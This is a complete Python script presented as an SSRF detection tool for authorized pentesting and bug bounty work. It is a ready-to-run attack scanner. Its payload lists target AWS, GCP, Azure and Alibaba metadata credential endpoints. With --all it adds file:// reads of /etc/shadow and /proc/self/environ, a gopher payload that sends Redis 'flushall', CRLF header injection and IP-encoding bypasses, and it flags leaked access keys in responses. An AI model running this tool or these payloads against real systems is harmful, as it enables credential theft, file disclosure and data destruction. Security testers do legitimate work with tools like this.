#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║           SSRF PROBER v2.0                               ║
║     Professional SSRF Detection Tool                     ║
║     For authorized pentesting / bug bounty only          ║
╚══════════════════════════════════════════════════════════╝

Usage:
    python3 ssrf_prober.py -u "https://target.com/fetch?url=FUZZ" [options]
    python3 ssrf_prober.py -u "https://target.com/api" -p url,src,path -d '{"url":"FUZZ"}' --json
    python3 ssrf_prober.py -l urls.txt --oob yourserver.oastify.com --all
    python3 ssrf_prober.py -u "https://target.com/fetch?url=FUZZ" --headers-inject "X-Forwarded-For,Referer"
"""

import argparse
import asyncio
import json
import re
import sys
import time
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime

try:
    import httpx
except ImportError:
    print("[!] Instala dependencias: pip install httpx rich")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.text import Text
    from rich.live import Live
    from rich.columns import Columns
    RICH = True
    console = Console()
except ImportError:
    RICH = False
    console = None

# ─────────────────────────────────────────────
#  PAYLOADS
# ─────────────────────────────────────────────

INTERNAL_HOSTS = [
    # Localhost variants
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://0x7f000001",
    "http://127.1",
    "http://127.0.1",
    # AWS Cloud metadata
    "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    # Common internal networks
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    # Internal services
    "http://localhost:8080",
    "http://localhost:8443",
    "http://localhost:9200",        # Elasticsearch
    "http://localhost:9200/_cat/indices",
    "http://localhost:6379",        # Redis (HTTP probe)
    "http://localhost:5984",        # CouchDB
    "http://localhost:5984/_all_dbs",
    "http://localhost:2375",        # Docker daemon
    "http://localhost:2375/version",
    "http://localhost:4848",        # Glassfish admin
    "http://localhost:8161",        # ActiveMQ
    "http://localhost:61616",       # ActiveMQ broker
    "http://localhost:7001",        # WebLogic
    "http://localhost:8888",        # Jupyter / misc
    "http://localhost:3000",        # Grafana / Node apps
    "http://localhost:8500",        # Consul
    "http://localhost:8500/v1/agent/self",
    "http://localhost:8600",        # Consul DNS
    "http://localhost:2181",        # Zookeeper
    "http://localhost:27017",       # MongoDB
    "http://localhost:5432",        # PostgreSQL probe
    "http://localhost:3306",        # MySQL probe
    "http://localhost:11211",       # Memcached
    "http://localhost:4040",        # Spark UI
    "http://localhost:9090",        # Prometheus
    "http://localhost:5601",        # Kibana
    "http://localhost:15672",       # RabbitMQ Management
]

BYPASS_PAYLOADS = [
    # Protocol abuse
    "dict://127.0.0.1:6379/info",
    "dict://localhost:11211/stat",
    "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a",
    "gopher://127.0.0.1:9200/_SEARCH",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/net/tcp",
    "file:///windows/win.ini",
    "file:///C:/Windows/System32/drivers/etc/hosts",
    # IP encoding bypasses
    "http://①②⑦.⓪.⓪.①",
    "http://127。0。0。1",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://[::ffff:7f00:1]",
    "http://[::ffff:127.0.0.1]",
    # DNS rebinding hints
    "http://localtest.me",
    "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
    "http://127.0.0.1.nip.io",
    # URL encoding tricks
    "http://127%2e0%2e0%2e1",
    "http://127%252e0%252e0%252e1",
    "http://%31%32%37%2e%30%2e%30%2e%31",
    # Mixed case / scheme confusion
    "HTTP://127.0.0.1",
    "hTTp://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    # CRLF injection hints
    "http://127.0.0.1%0d%0aHost: evil.com",
    # Rare schemes
    "ldap://127.0.0.1/",
    "sftp://127.0.0.1/",
    "tftp://127.0.0.1/",
    "jar:http://127.0.0.1!/",
    "netdoc:///etc/passwd",
]

# Headers commonly used as SSRF vectors
INJECTABLE_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "X-Original-URL",
    "X-Rewrite-URL",
    "Referer",
    "Host",
    "True-Client-IP",
    "CF-Connecting-IP",
    "X-ProxyUser-Ip",
    "Client-IP",
    "Forwarded",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Host",
    "X-Originating-IP",
]

OOB_PATHS = [
    "/",
    "/ssrf-test",
    "/latest/meta-data/",
    "/v1/",
    "/?ssrf=1",
    "/probe",
]

AWS_IMDSV2_TOKEN_URL = "http://169.254.169.254/latest/api/token"
AWS_IMDSV2_METADATA_URL = "http://169.254.169.254/latest/meta-data/"

# ─────────────────────────────────────────────
#  DATA STRUCTURES
# ─────────────────────────────────────────────

@dataclass
class SSRFResult:
    url: str
    payload: str
    param: str
    method: str
    status_code: int
    response_time: float
    response_length: int
    response_snippet: str
    indicators: list = field(default_factory=list)
    severity: str = "INFO"
    injection_type: str = "param"  # param | header | json | url
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self):
        return self.__dict__

    @property
    def dedup_key(self):
        """Key for deduplication: same payload+status+length+indicators = duplicate."""
        return (self.payload, self.status_code, self.response_length, tuple(sorted(self.indicators)))


@dataclass
class ProbeConfig:
    target_url: str
    params: list
    headers: dict
    json_body: Optional[str]
    is_json: bool
    oob_host: Optional[str]
    timeout: float
    concurrency: int
    verify_ssl: bool
    proxies: Optional[str]
    output_file: Optional[str]
    all_payloads: bool
    verbose: bool
    inject_headers: list  # headers to use as SSRF vectors
    rate_limit: float     # seconds between requests per domain (0 = disabled)
    imdsv2: bool          # probe AWS IMDSv2


# ─────────────────────────────────────────────
#  DETECTION ENGINE
# ─────────────────────────────────────────────

INDICATORS = {
    # AWS metadata — CRITICAL
    "ami-id":                   ("AWS EC2 metadata exposed", "CRITICAL"),
    "instance-id":              ("AWS instance metadata exposed", "CRITICAL"),
    '"AccessKeyId"':            ("AWS Access Key in response", "CRITICAL"),
    '"SecretAccessKey"':        ("AWS Secret Key in response", "CRITICAL"),
    "security-credentials":     ("AWS IAM credentials possibly exposed", "CRITICAL"),
    "iam/security-credentials": ("AWS IAM credentials endpoint reached", "CRITICAL"),
    # GCP — CRITICAL
    "computeMetadata":          ("GCP metadata endpoint hit", "CRITICAL"),
    "serviceAccounts":          ("GCP service account metadata", "CRITICAL"),
    "kube-env":                 ("GCP Kubernetes environment metadata", "CRITICAL"),
    # Azure — HIGH
    "Compute":                  ("Azure metadata indicator", "HIGH"),
    '"subscriptionId"':         ("Azure subscription metadata", "HIGH"),
    '"resourceGroupName"':      ("Azure resource group exposed", "HIGH"),
    # Files — CRITICAL
    "root:x:0:0":               ("Linux /etc/passwd content", "CRITICAL"),
    "[boot loader]":            ("Windows win.ini content", "CRITICAL"),
    "PATH=/":                   ("/proc/self/environ leaked", "CRITICAL"),
    # Internal IPs in response
    "127.0.0.1":                ("Localhost reference in response", "MEDIUM"),
    "192.168.":                 ("Internal IP range 192.168.x.x", "HIGH"),
    "10.0.":                    ("Internal IP range 10.x.x.x", "HIGH"),
    "172.16.":                  ("Internal IP range 172.16.x.x", "HIGH"),
    "169.254.":                 ("Link-local address in response", "HIGH"),
    # Services — CRITICAL/HIGH
    "redis_version":            ("Redis info page exposed", "CRITICAL"),
    "redis_mode":               ("Redis info page exposed", "CRITICAL"),
    "elasticsearch":            ("Elasticsearch response", "HIGH"),
    "_cluster/health":          ("Elasticsearch cluster info", "HIGH"),
    '"cluster_name"':           ("Elasticsearch cluster name", "HIGH"),
    "couchdb":                  ("CouchDB response", "HIGH"),
    '"docker-ce"':              ("Docker daemon response", "CRITICAL"),
    '"ApiVersion"':             ("Docker daemon API response", "CRITICAL"),
    "X-Docker-":                ("Docker daemon response header", "CRITICAL"),
    "grafana":                  ("Grafana instance exposed", "MEDIUM"),
    "consul":                   ("Consul service exposed", "HIGH"),
    '"datacenter"':             ("Consul datacenter info", "HIGH"),
    "prometheus":               ("Prometheus metrics exposed", "MEDIUM"),
    "rabbitmq":                 ("RabbitMQ exposed", "HIGH"),
    "ActiveMQ":                 ("ActiveMQ exposed", "HIGH"),
    "WebLogic":                 ("WebLogic exposed", "HIGH"),
    "Kibana":                   ("Kibana exposed", "MEDIUM"),
    # Generic
    "Internal Server Error":    ("Internal error (possible reflection)", "LOW"),
    "<!DOCTYPE html>":          ("HTML response to internal probe", "MEDIUM"),
    "Connection refused":       ("Port probe: connection refused", "INFO"),
}


def analyze_response(text: str, status: int, headers: dict) -> tuple:
    """
    Check response body AND headers for SSRF indicators.
    Returns (indicators: list[str], max_severity: str)
    """
    found = []
    max_sev = "INFO"
    sev_order = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}

    combined = text.lower() + " " + " ".join(f"{k}: {v}" for k, v in headers.items()).lower()

    for pattern, (msg, sev) in INDICATORS.items():
        if pattern.lower() in combined:
            label = f"{sev}: {msg}"
            if label not in found:
                found.append(label)
            if sev_order[sev] > sev_order[max_sev]:
                max_sev = sev

    # Status-based heuristics
    if status in (200, 201) and len(text) > 100 and max_sev == "INFO":
        max_sev = "LOW"
    if status in (301, 302):
        location = headers.get("location", "")
        if any(h in location for h in ["169.254", "127.0.0", "localhost", "192.168", "10."]):
            found.append("MEDIUM: Redirect toward internal resource")
            if sev_order["MEDIUM"] > sev_order[max_sev]:
                max_sev = "MEDIUM"

    # Check for AWS IMDSv2 token header in response (indicates server-side request)
    if "x-aws-ec2-metadata-token" in " ".join(headers.keys()).lower():
        found.append("CRITICAL: AWS IMDSv2 token in response headers")
        max_sev = "CRITICAL"

    return found, max_sev


# ─────────────────────────────────────────────
#  REQUEST ENGINE
# ─────────────────────────────────────────────

async def send_probe(
    client: httpx.AsyncClient,
    config: ProbeConfig,
    payload: str,
    param: str,
    injection_type: str = "param",
) -> Optional[SSRFResult]:
    """Inject payload and analyze response."""

    url = config.target_url
    body = None
    req_headers = dict(config.headers)
    method = "GET"

    try:
        if injection_type == "header":
            # Inject payload into HTTP header
            req_headers[param] = payload
            method = "GET"

        elif injection_type == "json" and config.json_body:
            # Safely inject into JSON body — escape payload for valid JSON
            escaped = json.dumps(payload)[1:-1]  # remove surrounding quotes
            raw = config.json_body.replace("FUZZ", escaped)
            body = raw
            req_headers.setdefault("Content-Type", "application/json")
            method = "POST"

        elif "FUZZ" in url:
            # Payload directly in URL template
            url = url.replace("FUZZ", urllib.parse.quote(payload, safe=":/?#[]@!$&'()*+,;="))
            method = "GET"

        else:
            # Inject as query parameter — preserve existing params without corruption
            parsed = urllib.parse.urlparse(url)
            existing_params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
            # Replace existing param or append
            new_params = [(k, v) for k, v in existing_params if k != param]
            new_params.append((param, payload))
            new_query = urllib.parse.urlencode(new_params)
            url = parsed._replace(query=new_query).geturl()
            method = "GET"

        # AWS GCP headers required for metadata access
        if "metadata.google.internal" in payload or "169.254.169.254" in payload:
            if "Metadata-Flavor" not in req_headers:
                req_headers["Metadata-Flavor"] = "Google"
            if "X-aws-ec2-metadata-token-ttl-seconds" not in req_headers:
                req_headers["X-aws-ec2-metadata-token-ttl-seconds"] = "21600"

        t0 = time.monotonic()
        if method == "GET":
            resp = await client.get(url, headers=req_headers)
        else:
            resp = await client.post(url, content=body, headers=req_headers)
        elapsed = time.monotonic() - t0

        text = resp.text[:8192]
        resp_headers = dict(resp.headers)
        indicators, severity = analyze_response(text, resp.status_code, resp_headers)

        if not indicators and not config.verbose:
            return None

        return SSRFResult(
            url=url,
            payload=payload,
            param=param,
            method=method,
            status_code=resp.status_code,
            response_time=round(elapsed, 3),
            response_length=len(resp.text),
            response_snippet=text[:300].replace("\n", " "),
            indicators=indicators,
            severity=severity,
            injection_type=injection_type,
        )

    except httpx.TimeoutException:
        if config.verbose:
            return SSRFResult(
                url=url, payload=payload, param=param, method=method,
                status_code=0, response_time=config.timeout,
                response_length=0, response_snippet="TIMEOUT",
                indicators=["LOW: Request timed out (possible blind SSRF)"],
                severity="LOW",
                injection_type=injection_type,
            )
    except httpx.ConnectError:
        if config.verbose:
            return SSRFResult(
                url=url, payload=payload, param=param, method=method,
                status_code=0, response_time=0,
                response_length=0, response_snippet="CONNECTION_ERROR",
                indicators=["INFO: Connection error"],
                severity="INFO",
                injection_type=injection_type,
            )
    except Exception as e:
        if config.verbose:
            return SSRFResult(
                url=url, payload=payload, param=param, method=method,
                status_code=0, response_time=0,
                response_length=0, response_snippet=str(e)[:200],
                indicators=[f"INFO: Exception - {type(e).__name__}"],
                severity="INFO",
                injection_type=injection_type,
            )
    return None


async def probe_aws_imdsv2(
    client: httpx.AsyncClient,
    config: ProbeConfig,
) -> list:
    """
    Dedicated AWS IMDSv2 probe: first attempts to obtain a token via PUT,
    then uses it to access metadata. This is a 2-step SSRF indicator.
    """
    results = []

    # Step 1: check if target reflects a PUT to the token endpoint
    token_payload = AWS_IMDSV2_TOKEN_URL
    result = await send_probe(client, config, token_payload, "url", "param")
    if result:
        result.indicators.append("INFO: AWS IMDSv2 token endpoint probed")
        results.append(result)

    # Step 2: metadata with token header (if server forwards headers)
    meta_headers = dict(config.headers)
    meta_headers["X-aws-ec2-metadata-token"] = "test-token-ssrf-probe"
    old_headers = config.headers
    config.headers = meta_headers
    result = await send_probe(client, config, AWS_IMDSV2_METADATA_URL, "url", "param")
    config.headers = old_headers
    if result:
        result.indicators.append("INFO: AWS IMDSv2 metadata endpoint probed with token header")
        results.append(result)

    return results


# Rate limiting per domain
_domain_locks: dict = defaultdict(asyncio.Lock)
_domain_last_request: dict = defaultdict(float)


async def rate_limited_probe(
    client: httpx.AsyncClient,
    config: ProbeConfig,
    payload: str,
    param: str,
    injection_type: str,
    semaphore: asyncio.Semaphore,
) -> Optional[SSRFResult]:
    async with semaphore:
        if config.rate_limit > 0:
            try:
                domain = urllib.parse.urlparse(config.target_url).netloc
                async with _domain_locks[domain]:
                    last = _domain_last_request[domain]
                    wait = config.rate_limit - (time.monotonic() - last)
                    if wait > 0:
                        await asyncio.sleep(wait)
                    _domain_last_request[domain] = time.monotonic()
            except Exception:
                pass
        return await send_probe(client, config, payload, param, injection_type)


async def run_probes(config: ProbeConfig) -> list:
    """Run all probes concurrently with rate limiting and deduplication."""

    payloads = list(INTERNAL_HOSTS)
    if config.all_payloads:
        payloads += BYPASS_PAYLOADS

    if config.oob_host:
        oob_base = f"http://{config.oob_host}"
        for path in OOB_PATHS:
            payloads.append(oob_base + path)

    params = config.params if config.params else ["url"]

    # Build task list
    task_defs = []

    # Param / URL injection
    has_fuzz_in_url = "FUZZ" in config.target_url
    for payload in payloads:
        if has_fuzz_in_url:
            # Only one "param" iteration needed when FUZZ is in URL
            task_defs.append((payload, "FUZZ", "url"))
        elif config.is_json and config.json_body:
            task_defs.append((payload, "body", "json"))
        else:
            for param in params:
                task_defs.append((payload, param, "param"))

    # Header injection
    for header_name in config.inject_headers:
        for payload in payloads:
            task_defs.append((payload, header_name, "header"))

    proxy = config.proxies or None
    mounts = None
    if proxy:
        mounts = {
            "http://": httpx.AsyncHTTPTransport(proxy=proxy),
            "https://": httpx.AsyncHTTPTransport(proxy=proxy),
        }

    results: list[SSRFResult] = []
    seen_keys: set = set()
    semaphore = asyncio.Semaphore(config.concurrency)
    total = len(task_defs)

    async with httpx.AsyncClient(
        timeout=config.timeout,
        verify=config.verify_ssl,
        follow_redirects=False,
        mounts=mounts,
    ) as client:
        # AWS IMDSv2 dedicated probes
        if config.imdsv2:
            imds_results = await probe_aws_imdsv2(client, config)
            for r in imds_results:
                if r.dedup_key not in seen_keys:
                    seen_keys.add(r.dedup_key)
                    results.append(r)
                    _print_result(r)

        coroutines = [
            rate_limited_probe(client, config, payload, param, inj_type, semaphore)
            for payload, param, inj_type in task_defs
        ]

        if RICH:
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold cyan]{task.description}"),
                BarColumn(bar_width=30),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn("({task.completed}/{task.total})"),
                TimeElapsedColumn(),
                console=console,
            ) as progress:
                task_id = progress.add_task(f"Probing {config.target_url[:50]}...", total=total)
                for coro in asyncio.as_completed(coroutines):
                    result = await coro
                    progress.advance(task_id)
                    if result:
                        key = result.dedup_key
                        if key not in seen_keys:
                            seen_keys.add(key)
                            results.append(result)
                            _print_result(result)
        else:
            for i, coro in enumerate(asyncio.as_completed(coroutines), 1):
                result = await coro
                print(f"\r[{i}/{total}]", end="", flush=True)
                if result:
                    key = result.dedup_key
                    if key not in seen_keys:
                        seen_keys.add(key)
                        results.append(result)
                        _print_result(result)
            print()

    return results


# ─────────────────────────────────────────────
#  OUTPUT
# ─────────────────────────────────────────────

SEV_COLORS = {
    "CRITICAL": "\033[91m",
    "HIGH":     "\033[38;5;208m",
    "MEDIUM":   "\033[93m",
    "LOW":      "\033[94m",
    "INFO":     "\033[90m",
}
SEV_RICH = {
    "CRITICAL": "bold red",
    "HIGH":     "bold orange1",
    "MEDIUM":   "bold yellow",
    "LOW":      "bold blue",
    "INFO":     "dim white",
}
RESET = "\033[0m"


def _print_result(r: SSRFResult):
    if RICH:
        sev_style = SEV_RICH.get(r.severity, "white")
        console.print(
            f"\n[{sev_style}][{r.severity}][/{sev_style}] "
            f"HTTP [cyan]{r.status_code}[/cyan] | "
            f"[dim]{r.response_length}B[/dim] | "
            f"[dim]{r.response_time}s[/dim] | "
            f"[magenta]{r.injection_type}[/magenta]:[green]{r.param}[/green]"
        )
        console.print(f"  [dim]Payload :[/dim] {r.payload}")
        for ind in r.indicators:
            console.print(f"  [yellow]↳[/yellow] {ind}")
        if r.response_snippet and r.response_snippet not in ("TIMEOUT", "CONNECTION_ERROR"):
            console.print(f"  [dim]Snippet :[/dim] {r.response_snippet[:120]}...")
    else:
        color = SEV_COLORS.get(r.severity, "")
        indicators_str = " | ".join(r.indicators) if r.indicators else "—"
        print(
            f"\n{color}[{r.severity}]{RESET} "
            f"HTTP {r.status_code} | {r.response_length}B | {r.response_time}s | "
            f"{r.injection_type}:{r.param}\n"
            f"  Payload : {r.payload}\n"
            f"  Hits    : {indicators_str}\n"
            f"  Snippet : {r.response_snippet[:120]}..."
        )


def print_summary(results: list):
    sev_order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
    sev_count = {s: 0 for s in sev_order}
    type_count = defaultdict(int)

    for r in results:
        sev_count[r.severity] = sev_count.get(r.severity, 0) + 1
        type_count[r.injection_type] += 1

    if RICH:
        console.print()
        if not results:
            console.print(Panel("[green]✓ No SSRF indicators found in responses.[/green]", title="Summary"))
            return

        table = Table(title="SSRF Probe Summary", show_header=True, header_style="bold cyan")
        table.add_column("Severity", style="bold")
        table.add_column("Count", justify="right")
        table.add_column("Injection Type Breakdown", style="dim")

        for sev in sev_order:
            count = sev_count[sev]
            if count:
                style = SEV_RICH[sev]
                breakdown = ", ".join(f"{k}: {v}" for k, v in type_count.items()) if sev == sev_order[0] else ""
                table.add_row(
                    Text(sev, style=style),
                    str(count),
                    breakdown,
                )
        console.print(table)

        # Injection type summary
        if type_count:
            console.print(f"  [dim]Injection types:[/dim] " + " | ".join(f"[magenta]{k}[/magenta]: {v}" for k, v in type_count.items()))
    else:
        if not results:
            print("\n[✓] No SSRF indicators found.")
            return
        print("\n" + "═" * 60)
        print("  SSRF PROBE SUMMARY")
        print("═" * 60)
        for sev in sev_order:
            count = sev_count[sev]
            if count:
                color = SEV_COLORS[sev]
                print(f"  {color}{sev:<10}{RESET} {count} finding(s)")
        print("═" * 60)


def save_output(results: list, path: str):
    data = {
        "generated_at": datetime.now().isoformat(),
        "total_findings": len(results),
        "findings": [r.to_dict() for r in results],
    }
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

    msg = f"[+] Results saved to {path}"
    if RICH:
        console.print(f"\n[green]{msg}[/green]")
    else:
        print(f"\n{msg}")


# ─────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────

def banner():
    b = """
\033[36m╔══════════════════════════════════════════════════════════╗
║           SSRF PROBER v2.0                               ║
║     For authorized pentesting / bug bounty only          ║
╚══════════════════════════════════════════════════════════╝\033[0m
"""
    print(b)


def parse_args():
    parser = argparse.ArgumentParser(
        description="Professional SSRF Detection Tool v2.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic GET param injection
  python3 ssrf_prober.py -u "https://target.com/fetch?url=FUZZ" --authorized

  # Multiple params + JSON body
  python3 ssrf_prober.py -u "https://target.com/api" -p url,redirect,src \\
      -d '{"endpoint":"FUZZ"}' --json --authorized

  # Header injection (X-Forwarded-For, Referer, etc.)
  python3 ssrf_prober.py -u "https://target.com/api" \\
      --headers-inject "X-Forwarded-For,X-Real-IP,Referer" --authorized

  # All bypass payloads + OOB callback + through Burp
  python3 ssrf_prober.py -u "https://target.com/api?url=FUZZ" \\
      --oob abc123.oastify.com --all \\
      --proxy http://127.0.0.1:8080 --no-verify -o results.json --authorized

  # AWS IMDSv2 dedicated probes
  python3 ssrf_prober.py -u "https://target.com/fetch?url=FUZZ" \\
      --imdsv2 --authorized

  # From URL list with rate limiting
  python3 ssrf_prober.py -l targets.txt --all --rate-limit 0.5 \\
      -o results.json --authorized
        """,
    )

    target = parser.add_mutually_exclusive_group(required=True)
    target.add_argument("-u", "--url", help="Target URL. Use FUZZ as injection point.")
    target.add_argument("-l", "--list", help="File with list of target URLs (one per line).")

    parser.add_argument(
        "-p", "--params", default="url",
        help="Comma-separated param names to inject (default: url)",
    )
    parser.add_argument(
        "-d", "--data",
        help="JSON body template. Use FUZZ as injection point. Requires --json.",
    )
    parser.add_argument(
        "--json", action="store_true",
        help="Send requests as JSON POST.",
    )
    parser.add_argument(
        "--oob",
        help="OOB callback host (Burp Collaborator, interactsh, etc.)",
    )
    parser.add_argument(
        "-H", "--header", action="append", dest="headers", default=[],
        help='Extra header(s). Format: "Name: Value". Can be used multiple times.',
    )
    parser.add_argument(
        "--cookie",
        help="Cookie header value (e.g. session=abc123)",
    )
    parser.add_argument(
        "--headers-inject",
        help=f"Comma-separated headers to use as SSRF injection vectors. "
             f"Available: {', '.join(INJECTABLE_HEADERS)}",
    )
    parser.add_argument(
        "--proxy",
        help="HTTP proxy (e.g. http://127.0.0.1:8080)",
    )
    parser.add_argument(
        "--timeout", type=float, default=8.0,
        help="Request timeout in seconds (default: 8)",
    )
    parser.add_argument(
        "-c", "--concurrency", type=int, default=20,
        help="Max concurrent requests (default: 20)",
    )
    parser.add_argument(
        "--rate-limit", type=float, default=0.0,
        help="Seconds between requests per domain (default: 0 = disabled)",
    )
    parser.add_argument(
        "--no-verify", action="store_true",
        help="Disable SSL verification",
    )
    parser.add_argument(
        "--all", action="store_true",
        help="Include bypass payloads (gopher, dict, file://, encoding tricks)",
    )
    parser.add_argument(
        "--imdsv2", action="store_true",
        help="Enable dedicated AWS IMDSv2 two-step probes",
    )
    parser.add_argument(
        "-o", "--output",
        help="Save results to JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="Show all requests including non-findings (timeouts, errors)",
    )
    parser.add_argument(
        "--authorized", action="store_true", required=True,
        help="REQUIRED. Confirms you have explicit written authorization to test this target.",
    )

    return parser.parse_args()


def build_headers(args) -> dict:
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    for h in args.headers:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = args.cookie
    return headers


async def main():
    banner()
    args = parse_args()

    # --authorized is required=True in argparse, so if we reach here it's set
    if RICH:
        console.print("[bold green][✓] Authorization confirmed. Proceeding with probes.[/bold green]\n")
    else:
        print("[✓] Authorization confirmed. Proceeding.\n")

    params = [p.strip() for p in args.params.split(",")]
    headers = build_headers(args)

    inject_headers = []
    if args.headers_inject:
        inject_headers = [h.strip() for h in args.headers_inject.split(",")]

    targets = []
    if args.url:
        targets = [args.url]
    elif args.list:
        with open(args.list) as f:
            targets = [line.strip() for line in f if line.strip()]

    all_results: list = []

    for i, target_url in enumerate(targets, 1):
        if len(targets) > 1:
            if RICH:
                console.rule(f"[cyan]Target {i}/{len(targets)}: {target_url}[/cyan]")
            else:
                print(f"\n[→] Target {i}/{len(targets)}: {target_url}")

        config = ProbeConfig(
            target_url=target_url,
            params=params,
            headers=headers,
            json_body=args.data,
            is_json=args.json,
            oob_host=args.oob,
            timeout=args.timeout,
            concurrency=args.concurrency,
            verify_ssl=not args.no_verify,
            proxies=args.proxy,
            output_file=args.output,
            all_payloads=args.all,
            verbose=args.verbose,
            inject_headers=inject_headers,
            rate_limit=args.rate_limit,
            imdsv2=args.imdsv2,
        )

        results = await run_probes(config)
        all_results.extend(results)

    print_summary(all_results)

    if args.output:
        save_output(all_results, args.output)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        msg = "\n[!] Interrupted by user."
        if RICH:
            console.print(f"[yellow]{msg}[/yellow]")
        else:
            print(msg)
        sys.exit(0)
